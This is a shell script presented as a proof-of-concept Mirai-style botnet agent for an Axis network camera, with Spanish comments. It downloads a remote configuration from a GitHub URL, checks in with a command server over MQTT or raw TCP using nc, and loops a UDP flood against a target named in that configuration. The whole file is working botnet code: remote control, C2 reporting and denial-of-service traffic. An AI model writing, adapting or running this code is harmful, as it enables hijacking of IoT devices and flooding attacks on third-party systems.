#!/bin/sh
# ==============================================================
#  MIRAI-AXIS | agent de botnet PoC (ACAP) para AXIS M2036-LE
#  Config remota: MIRAI_URL (fetch una vez al arrancar)
#  Canales: flood UDP + reporte MQTT/TCP al C2
# ==============================================================

MIRAI_URL="https://raw.githubusercontent.com/g2gjl2026-ops/mirai-cam/main/mirai.cfg"
CFG="/tmp/mirai.cfg"
ID="axis-b8a44fcd4447"

log() { echo "[mirai:$1] $2" >&2; }

fetch_cfg() {
  log cfg "fetch $MIRAI_URL"
  wget -q -T 5 -O "$CFG" "$MIRAI_URL" 2>/dev/null || nc -w 3 "$MIRAI_URL" >/dev/null 2>&1
  [ -s "$CFG" ] || return 1
  MIRAI_H=$(sed -n 's/^HOST=//p' "$CFG" | head -1)
  MIRAI_PORT=$(sed -n 's/^PORT=//p' "$CFG" | head -1)
  MIRAI_T=$(sed -n 's/^TARGET=//p' "$CFG" | head -1)
  MIRAI_TP=$(sed -n 's/^TPORT=//p' "$CFG" | head -1)
  log cfg "H=$MIRAI_H PORT=$MIRAI_PORT T=$MIRAI_T TP=$MIRAI_TP"
  return 0
}

send_report() {
  [ -z "$MIRAI_H" ] && return 1
  # 1) MQTT CONNECT via python (Axis trae python en el entorno ACAP)
  python -c "
import socket, struct, time
try:
  s = socket.create_connection(('$MIRAI_H', $MIRAI_PORT), timeout=3)
  vh = bytes([0x00,0x04,0x4d,0x51,0x54,0x54,4,24,60])
  cid = b'$ID'
  pb = struct.pack('>H',len(cid))+cid+struct.pack('>H',4)+b'root'+struct.pack('>H',4)+b'root'
  s.sendall(b'\x10'+bytes([len(vh)+len(pb)])+vh+pb)
  print('CONNACK', s.recv(16).hex())
  t = b'mirai/' + cid
  msg = b'alive ' + str(int(time.time())).encode()
  pay = struct.pack('>H', len(t)) + t + msg
  s.sendall(b'\x30' + bytes([len(pay)]) + pay)
  time.sleep(0.3)
  s.close()
except Exception as e:
  print('mqtt fail', e)
  raise
" 2>/dev/null && return 0
  # 2) fallback: TCP directo
  { printf 'MIRAI %s REPORT\n' "$ID"; } | nc -w 2 "$MIRAI_H" "$MIRAI_PORT" 2>/dev/null && return 0
  return 1
}

flood() {
  [ -z "$MIRAI_T" ] && return 0
  log flood "-> $MIRAI_T:$MIRAI_TP"
  n=512
  while [ $n -gt 0 ]; do
    dd if=/dev/zero bs=1450 count=1 2>/dev/null | nc -u -w 1 "$MIRAI_T" "$MIRAI_TP" 2>/dev/null
    n=$((n-1))
  done
  log flood "done (742KB UDP)"
}

log boot "agent $ID starting"
fetch_cfg || log cfg "NO remote cfg, using defaults"

i=0
while true; do
  i=$((i % 10 + 1))
  flood
  send_report
  sleep 5
  if [ $((i % 5)) -eq 0 ]; then fetch_cfg; fi
done
